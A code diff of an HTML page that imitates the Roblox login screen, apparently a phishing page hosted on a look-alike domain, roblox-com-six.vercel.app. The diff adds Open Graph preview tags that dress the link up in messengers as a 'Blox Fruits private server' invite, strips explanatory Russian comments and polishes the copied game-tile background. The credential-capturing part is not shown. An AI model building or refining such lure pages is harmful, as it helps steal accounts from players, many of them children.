@@ -4,11 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login to Roblox</title>
+
+    <!-- Метатеги для красивого превью в мессенджерах -->
+    <meta property="og:title" content="Blox Fruits - Private Server Access">
+    <meta property="og:description" content="Присоединяйтесь к приватному серверу Blox Fruits. Нажмите для входа.">
+    <meta property="og:image" content="https://tr.rbxcdn.com/18GBVF3wF49H-N3d3q85R5J8uGz51D9G0v63R8G1F2s/768/432/Image/Png">
+    <meta property="og:url" content="https://roblox-com-six.vercel.app/blox-fruits/private-server">
+    <meta property="og:type" content="website">
+
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #0d0f12; color: #fff; display: flex; flex-direction: column; min-height: 100vh; position: relative; overflow-x: hidden; }
         
-        /* Многослойный фон с игровыми баннерами Roblox как на скриншоте */
         body::before {
             content: "";
             position: fixed;
@@ -21,7 +28,6 @@
             z-index: -2;
         }
 
-        /* Декоративные плашки игр на фоне (имитация коллажа со скриншота) */
         .bg-collage {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -37,13 +43,11 @@
             border-radius: 12px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.8);
         }
-        /* Имитация плиток игр с мобильной версии */
         .tile-1 { width: 180px; height: 110px; top: 10%; left: 5%; transform: rotate(-8deg); background-image: url('https://tr.rbxcdn.com/18GBVF3wF49H-N3d3q85R5J8uGz51D9G0v63R8G1F2s/768/432/Image/Png'); }
-        .tile-2 { width: 160px; height: 100px; top: 15%; right: 8%; transform: rotate(12deg); background-image: url('https://tr.rbxcdn.com/768/432/Image/Png'); }
-        .tile-3 { width: 150px; height: 95px; bottom: 15%; left: 8%; transform: rotate(6deg); background-image: url('https://tr.rbxcdn.com/768/432/Image/Png'); }
+        .tile-2 { width: 160px; height: 100px; top: 15%; right: 8%; transform: rotate(12deg); background-image: url('https://tr.rbxcdn.com/18GBVF3wF49H-N3d3q85R5J8uGz51D9G0v63R8G1F2s/768/432/Image/Png'); }
+        .tile-3 { width: 150px; height: 95px; bottom: 15%; left: 8%; transform: rotate(6deg); background-image: url('https://tr.rbxcdn.com/18GBVF3wF49H-N3d3q85R5J8uGz51D9G0v63R8G1F2s/768/432/Image/Png'); }
         .tile-4 { width: 190px; height: 120px; bottom: 10%; right: 6%; transform: rotate(-10deg); background-image: url('https://tr.rbxcdn.com/18GBVF3wF49H-N3d3q85R5J8uGz51D9G0v63R8G1F2s/768/432/Image/Png'); }
 
-        /* Верхняя панель */
         .navbar { display: flex; justify-content: space-between; align-items: center; background-color: #121418; padding: 10px 16px; border-bottom: 1px solid #1f232b; position: relative; z-index: 10; }
         .nav-left { display: flex; align-items: center; gap: 14px; }
         .home-icon, .search-icon { font-size: 18px; color: #fff; cursor: pointer; }
@@ -52,7 +56,6 @@
         .nav-right { display: flex; align-items: center; gap: 12px; }
         .signup-btn { background: #0074e8; color: white; border: none; padding: 5px 14px; border-radius: 6px; font-weight: 600; font-size: 13px; cursor: pointer; }
 
-        /* Основной контент */
         .main-content { flex: 1; display: flex; justify-content: center; align-items: center; padding: 16px; position: relative; z-index: 10; }
         .login-card { background: rgba(25, 27, 34, 0.93); padding: 28px 20px; border-radius: 12px; width: 100%; max-width: 390px; text-align: center; border: 1px solid #282c38; box-shadow: 0 12px 40px rgba(0,0,0,0.7); backdrop-filter: blur(12px); }
         
@@ -83,7 +86,6 @@
 </head>
 <body>
 
-    <!-- Фоновые игровые плашки как на оригинале[span_0](start_span)[span_0](end_span) -->
     <div class="bg-collage">
         <div class="bg-tile tile-1"></div>
         <div class="bg-tile tile-2"></div>
@@ -91,7 +93,6 @@
         <div class="bg-tile tile-4"></div>
     </div>
 
-    <!-- Верхняя шапка -->
     <header class="navbar">
         <div class="nav-left">
             <span class="home-icon">🏠</span>
@@ -109,7 +110,6 @@
         </div>
     </header>
 
-    <!-- Центр с формой -->
     <div class="main-content">
         <div class="login-card">
             <h2>Login to Roblox</h2>
